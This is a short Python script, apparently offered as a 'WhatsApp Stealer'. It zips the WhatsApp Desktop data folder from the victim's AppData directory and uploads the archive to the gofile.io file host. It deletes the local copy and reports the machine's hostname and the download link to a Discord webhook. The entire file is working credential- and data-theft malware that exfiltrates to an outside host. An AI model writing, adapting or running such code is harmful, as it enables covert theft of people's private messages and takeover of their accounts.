import dhooks 
import os
import requests
import time
import socket
import shutil

WEBHOOK = "xpierroz on top"
direct = f"{os.getenv('LOCALAPPDATA')}\\Packages\\5319275A.WhatsAppDesktop_cv1g1gvanyjgm"
print(direct)

def uploadToAnonfiles(path):
    for x in range(10):
        try:
            rr = requests.post(
                f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile',
                files={
                    "file": open(path, "rb")
                },
            ).json()["data"]["downloadPage"]
            return rr
        except Exception:
            time.sleep(2)
    return False

try:
    shutil.make_archive("ssouput", "zip", direct)
except Exception: 
    pass

m = uploadToAnonfiles(f"{os.getcwd()}\\ssouput.zip")
os.remove(f"{os.getcwd()}\\ssouput.zip")
dhooks.Webhook(WEBHOOK).send(f"```xpierroz WhatsApp Stealer - grabbed {socket.gethostname()} - {m}```")